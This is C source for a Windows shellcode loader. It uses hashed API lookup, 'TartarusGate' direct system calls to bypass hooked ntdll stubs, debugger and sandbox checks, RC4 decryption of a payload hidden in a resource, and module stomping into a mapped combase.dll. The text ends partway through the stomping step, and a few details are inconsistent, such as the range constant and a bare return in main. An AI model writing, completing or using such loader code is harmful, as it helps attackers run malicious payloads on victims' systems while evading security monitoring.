#include <windows.h>

#define GetImageBase() (PVOID)(__readgsqword(0x60) ? ((PBYTE*)__readgsqword(0x60))[2] : NULL)


#define DEBUG_MODE 1

#if DEBUG_MODE
typedef int(__cdecl* fnPrintf)(const char*, ...);
#define PRINT(fmt, ...) do { \
        HMODULE hMsvcrt = LoadLibraryA("msvcrt.dll"); \
        if (hMsvcrt) { \
            fnPrintf pPrintf = (fnPrintf)GetProcAddress(hMsvcrt, "printf"); \
            if (pPrintf) pPrintf(fmt, ##__VA_ARGS__); \
        } \
    } while(0)
#else
#define PRINT(fmt, ...) 
#endif


/////////////////////////////////////
////////////////////////////  //////// MACROS & DJB2 HASHES
///////////////////////////////
#define IMAGE_DOS_SIGNATURE 0x5A4D
#define IMAGE_NT_SIGNATURE  0x00004550

#define OBJ_CASE_INSENSITIVE    0x00000040L
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define SEC_IMAGE               0x01000000

// InitializeObjectAttributes Macro (the function is actually a macro in the WDK)
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);          \
    (p)->RootDirectory = r;                          \
    (p)->Attributes = a;                             \
    (p)->ObjectName = n;                             \
    (p)->SecurityDescriptor = s;                     \
    (p)->SecurityQualityOfService = NULL;            \
}

#define HASH_NTOPENFILE      0xC29C5019 
#define HASH_NTCREATESECT    0xD02E20D0 
#define HASH_NTMAPVIEW       0x231F196A 
#define HASH_NTCLOSE         0x8B8E133D 
#define HASH_NTPROTECTVM     0x082962C8 
#define HASH_NTALLOCVM       0x6793C34C
#define HASH_NTCONTINUE      0x780A612C 

#define HASH_ADVAPI32        0x64bb3129 
#define HASH_SYSFUNC032      0x7733eed0 
#define HASH_GETMESSAGEW     0xcbceb9c1 

// TartarusGate config
#define RANGE 255
#define UP   -32
#define DOWN  32

///////////////////////////////////////////////////////////
//---------------------------------------------------------
// STRUCTS ++++++++++++++++++++++++++++++++++++++++++++++++
//---------------------------------------------------------
///////////////////////////////////////////////////////////

typedef struct _PEB {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;
    BYTE SpareBool;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    struct _PEB_LDR_DATA* Ldr;
    struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
} PEB, * PPEB;

typedef struct _CONTEXT CONTEXT;
typedef LONG KPRIORITY;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _T2_SET_PARAMETERS {
    ULONG Version;
    ULONG Reserved;
    LONGLONG NoWakeTolerance;
} T2_SET_PARAMETERS, * PT2_SET_PARAMETERS;

typedef NTSTATUS(NTAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* PNT_ALLOCATE_VIRTUAL_MEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

_Struct_size_bytes_(NextEntryOffset)
typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    ULONGLONG WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING, * PUSTRING;

// Function pointer for the RC4 
typedef NTSTATUS(WINAPI* fnSystemFunction032)(
    struct _USTRING* Img,
    struct _USTRING* Key
    );

typedef NTSTATUS(NTAPI* fnNtContinue)(
    PCONTEXT ContextRecord,
    BOOLEAN TestAlert
    );

typedef struct _IO_STATUS_BLOCK {
    union
    {
        LONG Status;        //0x0
        PVOID Pointer;      //0x0
    } DUMMYUNIONNAME;

    ULONG_PTR Information;  //0x8
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef HANDLE(WINAPI* fnCreateEventW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
typedef HANDLE(WINAPI* fnCreateTimerQueue)(void);
typedef BOOL(WINAPI* fnCreateTimerQueueTimer)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef DWORD(WINAPI* fnWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* fnSetEvent)(HANDLE);
typedef BOOL(WINAPI* fnDeleteTimerQueue)(HANDLE);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef VOID(WINAPI* fnRtlCaptureContext)(PCONTEXT);
typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//
// Custom Engine Structures ##############
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//

// Syscall metadata storage
typedef struct _TARTARUS_GATE_ENTRY {
    PVOID pSyscallAddress;
    WORD  wSSN;
} TARTARUS_GATE_ENTRY, * PTARTARUS_GATE_ENTRY;

// Nav Nav
typedef enum _SWITCH_FUNCTIONS {
    Entry,
    Debug,
    Tartarus,
    Deobfuscate,
    Sacrifice,
    Stomp,
    Ekko,
    IAThook,
    Cleanup,
    Wait,
    Exit
} SWITCH_FUNCTIONS;

typedef struct _VARIABLE_TABLE {
    PPEB Peb;
    DWORD64 NtdllBase;
    PVOID SacrificialModuleBase;
    PVOID SacrificialEntryPoint;

    PVOID PayloadBuffer;
    SIZE_T PayloadSize;

    HANDLE SacrificialFileHandle;
    HANDLE SacrificialSectionHandle;

    fnSystemFunction032 pSystemFunction032;

    struct {
        TARTARUS_GATE_ENTRY NtOpenFile;
        TARTARUS_GATE_ENTRY NtCreateSection;
        TARTARUS_GATE_ENTRY NtMapViewOfSection;
        TARTARUS_GATE_ENTRY NtClose;
        TARTARUS_GATE_ENTRY NtProtectVirtualMemory;
        TARTARUS_GATE_ENTRY NtAllocateVirtualMemory;
        TARTARUS_GATE_ENTRY NtContinue;
    } Sys;
} VARIABLE_TABLE, * PVARIABLE_TABLE;

//+++++++++++++++++++++++++++++++++++++++++++++//
// External Assembly Declarations (syscall.asm)
//---------------------------------------------//
extern void SetSSn(DWORD wSSN, PVOID pSyscallAddress);
extern NTSTATUS RunSyscall();

//////////////////////////////
// API HASHING & PE PARSING ////
//////////////////////////////////
FORCEINLINE DWORD HashStringA(const CHAR* String)
{
    DWORD Hash = 5381;
    int c;
    while ((c = *String++))
    {
        Hash = ((Hash << 5) + Hash) + c;
    }
    return Hash;
}

FORCEINLINE DWORD HashStringW_Lower(PCWSTR String)
{
    DWORD Hash = 5381;
    while (*String)
    {
        WCHAR c = *String++;
        if (c >= L'A' && c <= L'Z') c += 0x20;
        Hash = ((Hash << 5) + Hash) + (DWORD)c;
    }
    return Hash;
}

FORCEINLINE HMODULE CustomGetModuleHandle(DWORD ModuleHash)
{
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    // InLoadOrderModuleList (Offset 0x00) to avoid the 16-byte shift
    PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pCurrentEntry = pListHead->Flink;

    // loop until we wrap back around to the head of the list
    while (pCurrentEntry != pListHead)
    {
        // cast the entry directly to the table entry (safe because InLoadOrder is at offset 0)
        PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pCurrentEntry;

        // NULL guard the buffer and check length
        if (pDte->BaseDllName.Buffer != NULL && pDte->BaseDllName.Length > 0)
        {
            // DEBUG
            DWORD actualHash = HashStringW_Lower(pDte->BaseDllName.Buffer);
            PRINT("    [?] Found Module: %ws -> Hash: 0x%08X\n", pDte->BaseDllName.Buffer, actualHash);

            if (actualHash == ModuleHash)
            {
                return (HMODULE)pDte->DllBase;
            }
        }

        // Move to the next link
        pCurrentEntry = pCurrentEntry->Flink;
    }

    return NULL;
}

FORCEINLINE PVOID CustomGetProcAddress(PVOID ModuleBase, DWORD FunctionHash)
{
    if (!ModuleBase) return NULL;
    PBYTE pBase = (PBYTE)ModuleBase;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);

    ULONG exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    ULONG exportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (exportRva == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportRva);
    PDWORD pNames = (PDWORD)(pBase + pExport->AddressOfNames);
    PDWORD pFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    for (ULONG i = 0; i < pExport->NumberOfNames; i++)
    {
        CHAR* pCurrentName = (CHAR*)(pBase + pNames[i]);
        if (HashStringA(pCurrentName) == FunctionHash)
        {
            WORD ordinal = pOrdinals[i];
            DWORD functionRva = pFunctions[ordinal];

            // Forwarded Export Trap
            if (functionRva >= exportRva && functionRva < exportRva + exportSize) return NULL;
            return (PVOID)(pBase + functionRva);
        }
    }
    return NULL;
}

void Rc4Decrypt(PBYTE pData, SIZE_T sDataSize, PBYTE pKey, SIZE_T sKeySize)
{
    int i, j = 0, t;
    unsigned char s[256];

    // KSA
    for (i = 0; i < 256; i++) s[i] = (unsigned char)i;
    for (i = 0; i < 256; i++)
    {
        j = (j + s[i] + pKey[i % sKeySize]) % 256;
        t = s[i]; s[i] = s[j]; s[j] = (unsigned char)t;
    }

    // PRGA
    i = j = 0;
    for (SIZE_T x = 0; x < sDataSize; x++)
    {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        t = s[i]; s[i] = s[j]; s[j] = (unsigned char)t;
        pData[x] ^= s[(s[i] + s[j]) % 256];
    }
}

PVOID GetResourceData(PVOID ImageBase, WORD ResourceId, PSIZE_T pResourceSize)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + pDos->e_lfanew);

    PIMAGE_DATA_DIRECTORY pDataDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
    if (pDataDir->VirtualAddress == 0) return NULL;

    PIMAGE_RESOURCE_DIRECTORY pRoot = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)ImageBase + pDataDir->VirtualAddress);

    // Level 1: Type (10 = RT_RCDATA)
    PIMAGE_RESOURCE_DIRECTORY_ENTRY pTypeEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRoot + 1);
    PIMAGE_RESOURCE_DIRECTORY pNameDir = NULL;
    for (WORD i = 0; i < pRoot->NumberOfNamedEntries + pRoot->NumberOfIdEntries; i++)
    {
        if (pTypeEntries[i].Id == 10)
        {
            pNameDir = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)pRoot + (pTypeEntries[i].OffsetToData & 0x7FFFFFFF));
            break;
        }
    }
    if (!pNameDir) return NULL;

    // Level 2: Name/ID (Matches the ID in koala.rc)
    PIMAGE_RESOURCE_DIRECTORY_ENTRY pNameEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pNameDir + 1);
    PIMAGE_RESOURCE_DIRECTORY pLangDir = NULL;
    for (WORD i = 0; i < pNameDir->NumberOfNamedEntries + pNameDir->NumberOfIdEntries; i++)
    {
        if (pNameEntries[i].Id == ResourceId)
        {
            pLangDir = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)pRoot + (pNameEntries[i].OffsetToData & 0x7FFFFFFF));
            break;
        }
    }
    if (!pLangDir) return NULL;

    // Level 3: Language
    PIMAGE_RESOURCE_DIRECTORY_ENTRY pLangEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pLangDir + 1);
    PIMAGE_RESOURCE_DATA_ENTRY pDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((PBYTE)pRoot + (pLangEntries[0].OffsetToData & 0x7FFFFFFF));

    *pResourceSize = pDataEntry->Size;
    return (PVOID)((PBYTE)ImageBase + pDataEntry->OffsetToData);
}

//////////////////////////////////////////
// ///SYSCALL RESOLUTION (TARTARUS GATE) //////////
////////////////////////////////////////////////////////

BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PTARTARUS_GATE_ENTRY pNtSys, IN PVARIABLE_TABLE Table)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)Table->NtdllBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)Table->NtdllBase + pDos->e_lfanew);

    // Safety check for Export Directory
    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)Table->NtdllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pdwAddrNames = (PDWORD)((PBYTE)Table->NtdllBase + pExport->AddressOfNames);
    PDWORD pdwAddrFuncs = (PDWORD)((PBYTE)Table->NtdllBase + pExport->AddressOfFunctions);
    PWORD pwAddrOrds = (PWORD)((PBYTE)Table->NtdllBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        PCHAR pcFuncName = (PCHAR)((PBYTE)Table->NtdllBase + pdwAddrNames[i]);
        PVOID pFuncAddress = (PVOID)((PBYTE)Table->NtdllBase + pdwAddrFuncs[pwAddrOrds[i]]);

        // Calculate the hash once so we can print it and compare it
        DWORD currentHash = HashStringA(pcFuncName);

        // --- DEBUG  ++++
        if (pcFuncName[0] == 'N' && pcFuncName[1] == 't') {

            // Uncomment the line below to dump all Nt hashes to the console        [ !!! ]
            //PRINT("    [?] EAT Export: %s -> Hash: 0x%08X\n", pcFuncName, currentHash);
        }
        // ===================================================

        if (currentHash == dwSysHash)
        {
            pNtSys->pSyscallAddress = pFuncAddress;

            // Clean Stub (4C 8B D1 B8)
            if (*((PBYTE)pFuncAddress) == 0x4C && *((PBYTE)pFuncAddress + 3) == 0xB8)
            {
                pNtSys->wSSN = ((*(PBYTE)((PBYTE)pFuncAddress + 5)) << 8) | (*(PBYTE)((PBYTE)pFuncAddress + 4));
                return TRUE;
            }

            // Hooked (Offset 0 or Offset 3)
            if (*((PBYTE)pFuncAddress) == 0xE9 || *((PBYTE)pFuncAddress + 3) == 0xE9)
            {
                for (WORD idx = 1; idx <= 32; idx++) // Assuming RANGE is 32
                {
                    // Check Downwards
                    PBYTE pDown = (PBYTE)pFuncAddress + (idx * 32); // Assuming DOWN is 32
                    if (*(pDown) == 0x4C && *(pDown + 3) == 0xB8)
                    {
                        pNtSys->wSSN = ((*(pDown + 5)) << 8) | (*(pDown + 4)) - idx;
                        return TRUE;
                    }
                    // Check Upwards
                    PBYTE pUp = (PBYTE)pFuncAddress - (idx * 32); // Assuming UP is -32
                    if (*(pUp) == 0x4C && *(pUp + 3) == 0xB8)
                    {
                        pNtSys->wSSN = ((*(pUp + 5)) << 8) | (*(pUp + 4)) + idx;
                        return TRUE;
                    }
                }
            }
        }
    }
    return FALSE;
}

//\\//\\//\\//\\//\\//\\//\\//\\//
//\ Recursive Execution  /\/\/\//
//\\//\\//\\//\\//\\//\\//\\\\//
int main()
{
    // Initialize our global variables
    VARIABLE_TABLE RealTable = { 0 };
    PVARIABLE_TABLE Table = &RealTable;
    SWITCH_FUNCTIONS currentState = Entry;

    // The Flat State Machine
    while (currentState != Exit)
    {
        switch (currentState)
        {

        case Entry:
        {
            PRINT("[*] State: Entry\n");
            Table->Peb = (PPEB)__readgsqword(0x60);
            PRINT("    [-] PEB resolved at: 0x%p\n", Table->Peb);

            Table->NtdllBase = CustomGetModuleHandle(0x22D3B5ED);
            PRINT("    [-] ntdll.dll Base: 0x%p\n", Table->NtdllBase);

            if (Table->NtdllBase == NULL)
            {
                PRINT("[!] CRITICAL: Failed to find ntdll.dll =  Check DJB2 hash!\n");
                currentState = Exit;
            }

            currentState = Tartarus; // change Tartarus to Debug to turn on anti-debugging
        }
        break;

        case Debug:
        {
            PRINT("[*] State: Debug\n");

            if (Table->Peb->BeingDebugged == 1)
            {
                PRINT("[!] ANTI-ANALYSIS: PEB->BeingDebugged is TRUE!!! EXITING!!!\n");
                currentState = Exit;
                break;
            }

            PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)Table->Peb + 0xBC); // Offset 0xBC on x64
            if ((*pNtGlobalFlag & 0x70) != 0)
            {
                PRINT("[!] ANTI-ANALYSIS: NtGlobalFlag indicates debugger. Exiting.\n");
                currentState = Exit;
                break;
            }

            // The PEB natively stores the number of logical processors at offset 0xB8 (x64)
            PDWORD pNumProcessors = (PDWORD)((PBYTE)Table->Peb + 0xB8);
            if (*pNumProcessors < 2)
            {
                PRINT("[!] ANTI-ANALYSIS: Less than 2 CPU cores detected. Exiting.\n");
                currentState = Exit;
                break;
            }

            // KUSER_SHARED_DATA is mapped to 0x7FFE0000 on windows procs
            // Offset 0x02D8 holds NumberOfPhysicalPages = multiply by 4096 
            PDWORD pPhysicalPages = (PDWORD)(0x7FFE02D8);
            DWORD64 totalRamBytes = (DWORD64)(*pPhysicalPages) * 4096;

            // Check if RAM is less than 4GB 
            if (totalRamBytes < (DWORD64)4294967296)
            {
                PRINT("[!] ANTI-ANALYSIS: Less than 4GB RAM detected!!! Exiting!!!\n");
                currentState = Exit;
                break;
            }

            PRINT("[+] Sandbox checks passed! Environment is clean :D\n");

            currentState = Tartarus;
        }
        break;

        case Tartarus:
        {
            PRINT("[*] State: TARTARUS resolving syscalls\n");

            BOOL bSuccess = FALSE;

            bSuccess = FetchNtSyscall(HASH_NTOPENFILE, &Table->Sys.NtOpenFile, Table);
            PRINT("    [-] NtOpenFile         SSN: 0x%04X (Success: %d)\n", Table->Sys.NtOpenFile.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtOpenFile\n");
                currentState = Exit;
            }

            bSuccess = FetchNtSyscall(HASH_NTCREATESECT, &Table->Sys.NtCreateSection, Table);
            PRINT("    [-] NtCreateSection    SSN: 0x%04X (Success: %d)\n", Table->Sys.NtCreateSection.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtCreateSection\n");
                currentState = Exit;
            }

            bSuccess = FetchNtSyscall(HASH_NTMAPVIEW, &Table->Sys.NtMapViewOfSection, Table);
            PRINT("    [-] NtMapViewOfSection SSN: 0x%04X (Success: %d)\n", Table->Sys.NtMapViewOfSection.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtMapViewOfSection\n");
                currentState = Exit;
            }

            bSuccess = FetchNtSyscall(HASH_NTCLOSE, &Table->Sys.NtClose, Table);
            PRINT("    [-] NtClose            SSN: 0x%04X (Success: %d)\n", Table->Sys.NtClose.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtClose\n");
                currentState = Exit;
            }

            bSuccess = FetchNtSyscall(HASH_NTPROTECTVM, &Table->Sys.NtProtectVirtualMemory, Table);
            PRINT("    [-] NtProtectVM        SSN: 0x%04X (Success: %d)\n", Table->Sys.NtProtectVirtualMemory.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtProtectVirtualMemory\n");
                currentState = Exit;
            }

            bSuccess = FetchNtSyscall(HASH_NTALLOCVM, &Table->Sys.NtAllocateVirtualMemory, Table);
            PRINT("    [-] NtProtectVM        SSN: 0x%04X (Success: %d)\n", Table->Sys.NtAllocateVirtualMemory.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtAllocateVirtualMemory\n");
                currentState = Exit;
            }

            bSuccess = FetchNtSyscall(HASH_NTCONTINUE, &Table->Sys.NtContinue, Table);
            PRINT("    [-] NtContinue         SSN: 0x%04X (Success: %d)\n", Table->Sys.NtContinue.wSSN, bSuccess);
            if (!bSuccess)
            {
                PRINT("[!] CRITICAL: Failed to resolve NtContinue\n");
                currentState = Exit;
            }

            PRINT("[+] All Syscalls resolved successfully! :D\n");
            currentState = Deobfuscate;
        }
        break;

        case Deobfuscate:
        {

            unsigned char rc4Key[] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
            PRINT("[*] State: Deobfuscate (Testing RAW Payload)\n");

            // Still need to fetch the data from .rsrc
            PVOID pResourceData = GetResourceData(GetImageBase(), 101, &Table->PayloadSize);
            if (!pResourceData || Table->PayloadSize == 0)
            {
                PRINT("[!] Failed to locate resource 101\n");
                return;
            }

            Table->PayloadBuffer = VirtualAlloc(NULL, Table->PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            memcpy(Table->PayloadBuffer, pResourceData, Table->PayloadSize);

            // COMMENT OUT FOR ENCRYPT/DECRYPT DEBUGGING
            Rc4Decrypt((PBYTE)Table->PayloadBuffer, Table->PayloadSize, rc4Key, sizeof(rc4Key) - 1);

            PRINT("[+] Payload loaded into buffer (%zu bytes)\n", Table->PayloadSize);
            currentState = Sacrifice;
        }
        break;

        case Sacrifice:
        {
            PRINT("[*] State: Sacrifice\n");

            IO_STATUS_BLOCK ioStatus;
            OBJECT_ATTRIBUTES objAttr;
            UNICODE_STRING uPath;

            // Native API requires the \??\ prefix for local paths. C:\Windows... will FAIL SILENTLY
            wchar_t* path = L"\\??\\C:\\Windows\\System32\\combase.dll";
            uPath.Buffer = path;
            uPath.Length = lstrlenW(path) * sizeof(wchar_t);
            uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

            InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

            PRINT("    [-] Attempting NtOpenFile on: %ws\n", path);
            SetSSn(Table->Sys.NtOpenFile.wSSN, Table->Sys.NtOpenFile.pSyscallAddress);
            NTSTATUS status = RunSyscall(&Table->SacrificialFileHandle, FILE_GENERIC_READ | FILE_EXECUTE,
                &objAttr,
                &ioStatus,
                FILE_SHARE_READ,
                FILE_NON_DIRECTORY_FILE);

            PRINT("    [-] NtOpenFile Status: 0x%08X (Handle: 0x%p)\n", status, Table->SacrificialFileHandle);
            if (status != 0x00000000)
            {
                PRINT("[!] CRITICAL: NtOpenFile failed\n");
                currentState = Exit;
            }

            PRINT("    [-] Attempting NtCreateSection...\n");
            SetSSn(Table->Sys.NtCreateSection.wSSN, Table->Sys.NtCreateSection.pSyscallAddress);
            status = RunSyscall(&Table->SacrificialSectionHandle,
                SECTION_MAP_READ | SECTION_MAP_EXECUTE,
                NULL,
                NULL,
                PAGE_EXECUTE_READ,
                SEC_IMAGE,
                Table->SacrificialFileHandle);

            PRINT("    [-] NtCreateSection Status: 0x%08X (Handle: 0x%p)\n", status, Table->SacrificialSectionHandle);
            if (status != 0x00000000)
            {
                PRINT("[!] CRITICAL: NtCreateSection failed\n");
                currentState = Exit;
            }

            SIZE_T viewSize = 0;
            PVOID pBase = NULL; // Use a local variable first to ensure the syscall fills it

            PRINT("    [-] Attempting NtMapViewOfSection...\n");
            SetSSn(Table->Sys.NtMapViewOfSection.wSSN, Table->Sys.NtMapViewOfSection.pSyscallAddress);

            // Explicitly cast to 64-bit alignment for the ROP/Syscall wrapper
            status = RunSyscall(
                Table->SacrificialSectionHandle,
                (HANDLE)-1,
                &pBase,
                (ULONG_PTR)0,    // Argument 4 (R9)
                (SIZE_T)0,       // Argument 5 (Stack - CommitSize) -> FORCES 64-BIT ZERO
                (PVOID)NULL,     // Argument 6 (Stack - SectionOffset) -> FORCES 64-BIT ZERO
                &viewSize,
                1,
                0,
                PAGE_EXECUTE_READ
            );

            if (status != 0) {
                PRINT("[!] CRITICAL: NtMapViewOfSection failed: 0x%08X\n", status);
                return; // EXIT IMMEDIATELY - DO NOT GO TO STOMP
            }

            Table->SacrificialModuleBase = pBase;
            PRINT("    [-] NtMapViewOfSection Success (Base: 0x%p)\n", Table->SacrificialModuleBase);

            // Clean up handles
            SetSSn(Table->Sys.NtClose.wSSN, Table->Sys.NtClose.pSyscallAddress);
            RunSyscall(Table->SacrificialFileHandle);
            SetSSn(Table->Sys.NtClose.wSSN, Table->Sys.NtClose.pSyscallAddress);
            RunSyscall(Table->SacrificialSectionHandle);

            currentState = Stomp;
        }
        break;

        case Stomp:
        {
            PRINT("[*] State: Stomp \n");

            // parse PE headers
            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)Table->SacrificialModuleBase;
            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)Table->SacrificialModuleBase + pDos->e_lfanew);

            // calc the address
            Table->SacrificialEntryPoint = (PVOID)((PBYTE)Table->SacrificialModuleBase + pNt->OptionalHeader.AddressOfEntryPoint);
            PRINT("    [-] Sacrificial EntryPoint calculated at: 0x%p\n", Table->SacrificialEntryPoint);

            // prep for NtProtectVirtualMemory
            PVOID pBaseAddress = Table->SacrificialEntryPoint;

            // USE A TEMPORARY VARIABLE SO THE SYSCALL DOESN'T CORRUPT OUR EXACT PAYLOAD SIZE
            SIZE_T sProtectSize = Table->PayloadSize;
            ULONG uOldProtect = 0;

            PRINT("    [-] Unlocking memory (PAGE_READWRITE)...\n");

            SetSSn(Table->Sys.NtProtectVirtualMemory.wSSN, Table->Sys.NtProtectVirtualMemory.pSyscallAddress);
            NTSTATUS status = RunSyscall((HANDLE)-1, &pBaseAddress, &sProtectSize, PAGE_READWRITE, &uOldProtect);

            if (status != 0x00000000)
            {
                PRINT("[!] CRITICAL: NtProtectVirtualMemory (Unlock) failed: 0x%08X\n", status);
            }

            // stomp shellcode
            PRINT("    [-] Stomping %zu bytes of payload...\n", Table->PayloadSize);

            volatile BYTE* pStompTarget = (volatile BYTE*)Table->SacrificialEntryPoint;
